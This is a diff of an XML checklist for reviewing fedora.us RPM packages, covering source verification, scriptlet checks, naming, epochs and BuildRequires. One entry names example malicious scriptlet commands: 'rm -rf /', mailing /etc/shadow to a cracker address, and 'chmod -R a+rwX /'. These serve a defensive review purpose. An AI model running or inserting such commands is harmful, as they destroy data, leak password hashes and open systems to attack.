@@ -1,51 +1,63 @@
 <?xml version='1.0' ?>
-  
+<!DOCTYPE checklist SYSTEM "checklist.dtd">
 <checklist version='0.1' name="fedoraus" revision="0.1">
   <category name='Security'>
-    <description>Security Concerns</description>
+    <description>Security items warrant extra attention.  If something slips
+      through here, it could lead to malicious code executing on, not just
+      your machine, but those of people running the package you
+      approved.</description>
     <entry name='Canonical Source'>
       <display default='true'/>
       <states>
-        <state name='Pass'>
-          <output>Source URL %s is canonical</output>
-        </state>
-        <state name='Fail'>
-          <output>Source URL wrong; %s is the canonical URL</output>
-        </state>
+        <state name='Pass'>Source URL is canonical</state>
+        <state name='Fail'>Specified Source URL is not canonical</state>
       </states>
-      <description>You should check to be sure the Source line contains a valid URL.
-        This helps ensure that the person creating the RPM is not downloading
-        a trojan source tarball from an unknown entity.</description>
-      <input>Source URL</input>
+      <description>You should check to be sure the Source and URL fields
+        point to canonical sources for the software project.  This helps
+        ensure that the person creating the RPM is not downloading a trojan
+        source tarball from an unknown entity.  Using google to search for
+        canonical home pages is one good way to verify this.</description>
     </entry>
     <entry name='MD5Sum verified'>
       <display default='true'/>
       <states>
-        <state name='Pass'>
-          <output>Upstream MD5Sum verified</output>
-        </state>
-        <state name='Fail'>
-          <output>Upstream MD5Sum does not match!</output>
-        </state>
+        <state name='Pass'>Upstream MD5Sum verified</state>
+        <state name='Fail'>Upstream MD5Sum does not match!</state>
       </states>
-      <description>You should always verify that the upstream source matches the
-        source provided in the SRPM.  One method of doing this is to download
+      <description>You should always verify that the upstream source matches
+        the source provided in the SRPM.  One technique is to download
         the pristine source from a known canonical web site and take the MD5
         hash of it with md5sum.  Comparing this hash to the hash of the
-        source in the SRPM should be identical.</description>
+        source in the SRPM should be identical.  A second method is to
+        download the SRPM for the same package/version from another
+        distribution and compare the MD5 hashes of the Source tarball in
+        that package with the hashes in the package you are reviewing.  This
+        kind of redundant check helps insure that trojaned sources aren't
+        being introduced to the package.</description>
+    </entry>
+    <entry name="Install time scriptlet safety">
+      <display default='false' />
+      <states>
+        <state name='Pass'>Install time scriptlets do not have obvious malicious code.</state>
+        <state name='Fail'>Install time scriplet does unsafe things. [REVIEWER please add details]</state>
+        <state name='Not-Applicable'>There are no install time scriptlets</state>
+      </states>
+      <description>The install time scriplets in the %pre, %post, %preun, and
+        %postun are arbitrary shell scripts that are executed when the RPM
+        package is installed or de-installed from the system.  Typically, the
+        root user has to install and deinstall so these scripts execute as
+        root.  It is very important that they are checked for flaws that might
+        make the system more insecure or remove needed files from the
+        filesystem.  Some examples are 'rm -rf /',
+        'mail cracker@domain.com &lt; /etc/shadow', 'chmod -R a+rwX /'
+      </description>
     </entry>
     <entry name='Upstream GPG Checked'>
       <display default='false'/>
       <states>
-        <state name='Pass'>
-          <output>Good upstream GPG Signature: %s</output>
-        </state>
-        <state name='Fail'>
-          <output>Upstream GPG Signatures do not match: %s</output>
-        </state>
-        <state name='Not-Applicable'>
-          <output>No upstream GPG</output>
-        </state>
+        <state name='Pass'>Good upstream GPG Signature</state>
+        <state name='Fail'>Upstream GPG Signatures do not match</state>
+        <state name='Not-Applicable'>No upstream GPG Signature</state>
       </states>
       <description>Whenever possible, you should check that the upstream tarball is
         truly from a trusted source.  One method of doing this is to have the
@@ -54,20 +66,71 @@
         file with MD5sums of the source tarballs.  If the upstream developer
         uses either of these methods, please be sure to verify the source by
         checking the valdity of the gpg signatures.</description>
-      <input>GPG output</input>
     </entry>
   </category>
-  <category name="Spec">
-    <description>Potential spec file problems</description>
+  <category name="Specfile Scan">
+    <description>You should always look over the spec file before attempting
+      to rebuild a package.  After all, the spec file contains commands that
+      will be executed on your machine with your permissions.  If you don't
+      check first, there's no telling what programs the package author may
+      be trying to execute.</description>
+    <entry name="Package Naming">
+      <display default="false" />
+      <states>
+        <state name='Pass'>Package name conforms to the Fedora Naming Guidelines</state>
+        <state name='Fail'>Package needs to be renamed to meet the Fedora Naming Guidelines</state>
+      </states>
+      <description>The Fedora Package Naming Guidelines specify a way to
+        name packages that is easy to understand, allows smooth upgrading
+        between package releases, and minimizes package conflicts with
+        future Fedora Core distribution upgrades.  Please see:
+        http://videl.ics.hawaii.edu/pipermail/fedora-devel/2003-March/000715.html
+        for the gory details.</description>
+    </entry>
+    <entry name="Install time scriptlet bugs">
+      <display default='false'/>
+      <states>
+        <state name='Pass'>No bugs found in install time scriptlets</state>
+        <state name='Fail'>Install time scriptlet bug! [REVIEWER: Please add details]</state>
+        <state name='Non-Blocker'>Minor scriptlet bug [REVIEWER: Please add details]</state>
+        <state name='Not-Applicable'>There are no install time scriptlets</state>
+      </states>
+      <description>%pre, %preun, %post, and %postun scripts are necessary to
+        perform necessary prep work on a computer before software is installed
+        on it and to continue setup after the package's files have been
+        unpacked to the filesystem.  Leaving out these automated tasks is a
+        common problem with binary packages.  Examples to watch for: if a
+        package installs libraries (*.so.* files) into %{_libdir}, does the
+        %post and %postun run /sbin/ldconfig?  If the package has *.info
+        files, does %post use install-info to install?  Does %postun use
+        'if [$1 = 0]; then install-info --delete [INFOFILE]; fi' (The 'if'
+        statement makes uninstall only occur on package removal, not upgrade.)
+        Please see the sample spec generated by fedora-newrpmspec for other
+        things to watch out for.
+      </description>
+    </entry>
+    <entry name='Epoch'>
+      <display default='false'/>
+      <states>
+        <state name='Pass'>Explicit dependencies properly use epoch with version</state>
+        <state name='Fail'>An explicit dependency is used without proper epoch/version</state>
+      </states>
+      <description>When you create a package-version dependency in an RPM
+        spec using "Requires:", "BuildRequires", "Provides", "Obsoletes",
+        "Conflicts", or "BuildConflicts" you need to specify the Epoch along
+        with the rest of the version (0 if none are explicitly specified on
+        that package.)  This is because rpm is in the process of
+        transitioning to making Epoch 0 when not specified but hasn't yet
+        applied this completely.  So there are cases where package dependency
+        information is broken without this explicit specification.  Example
+        of a proper dependency with version information:
+        BuildRequires: foobar &gt;= 0:1.0</description>
+    </entry>
     <entry name="BuildRoot">
       <display default='false'/>
       <states>
-        <state name='Pass'>
-          <output>Buildroot has all required elements</output>
-        </state>
-        <state name='Fail'>
-          <output>Buildroot lacks certain elements</output>
-        </state>
+        <state name='Pass'>Buildroot has all required elements</state>
+        <state name='Fail'>Buildroot lacks certain elements</state>
       </states>
       <description>The spec file's BuildRoot: must contain %{_tmppath} in as a prefix
         so the local user can define where packages are temporarily installed.
@@ -75,6 +138,60 @@
         should multiple users be creating packages.  The Fedora suggested
         BuildRoot is:
         %{_tmppath}/%{name}-%{version}-%{release}-root-%(%{__id_u} -n)</description>
+    </entry>
+  </category>
+  <category name="Build and test">
+    <description>After looking over the spec file, you have to attempt to
+      get the package to build, install, and run.</description>
+    <entry name="Mandatory BuildRequires">
+      <display default='false' />
+      <states>
+        <state name='Pass'>All necessary BuildRequires listed.</state>
+        <state name='Fail'>Package needs additional BuildRequires: [REVIEWER: Please list]</state>
+      </states>
+      <description>Building a package requires tools (such as a compiler for
+        the programming language) and libraries in order to be created. These
+        required build dependencies must be mentioned in a BuildRequires:
+        field of the rpm spec file so that rpmbuild can assure that they are
+        available to the build system before attempting to build the package.
+        Complicating things, some packages (examples: gcc, glibc) are assumed
+        to be present on any buildsystem and others are pulled in
+        automatically because another BuildRequires needs them (example:
+        if the package requires gtk2-devel and glib2-devel for header files
+        glib2-devel will be automatically pulled in if you list gtk2-devel
+        because gtk2-devel has a dependency on glib2-devel.) Neither of these
+        automatic dependencies should be listed.  (To continue the example,
+        you'd have "BuildRequires: gtk2-devel" in the spec and not mention
+        glib2-devel.)
+        Mach is a tool that can aid in finding required build dependencies.
+        Please see:
+        http://www.fedora.us/wiki/HOWTOFindMissingBuildRequires in the section
+        on using mach for more information about this.</description>
+    </entry>
+    <entry name="Features and BuildRequires">
+      <display default='false' />
+      <states>
+        <state name='Pass'>All desired features are enabled</state>
+        <state name='Fail'>Desirable features need extra BuildRequires: [REVIEWER: Please list]</state>
+        <state name='Non-Blocker'>Some minor features were left out of this build: [REVIEWER please list]</state>
+        <state name='Not-Applicable'>No optional features</state>
+      </states>
+      <description>Sometimes a package can have desirable optional
+        features built in but they need to be specifically asked for during
+        the building of the package (usually as switches to configure but
+        occassionally through editing build-time configuration files.)
+        Other times, optional features will be configured by the package's
+        configure script but only if the build system has the libraries
+        needed to make the feature work.  In order to track these down you
+        need to try a variety of method: viewing the output of configure
+        scripts during the build, reading the package's configure.in (or
+        configure.ac), seeing what the package's ./configure --help says,
+        and reading the INSTALL and README documentation in the program's
+        source are some examples.  When you find a feature that just needs
+        enabling, you should point it out to the packager.  When an optional
+        feature needs a specific library in order to compile, you need to
+        list it as a BuildRequires in the spec to be sure the build system
+        will pull it in.</description>
     </entry>
   </category>
 </checklist>
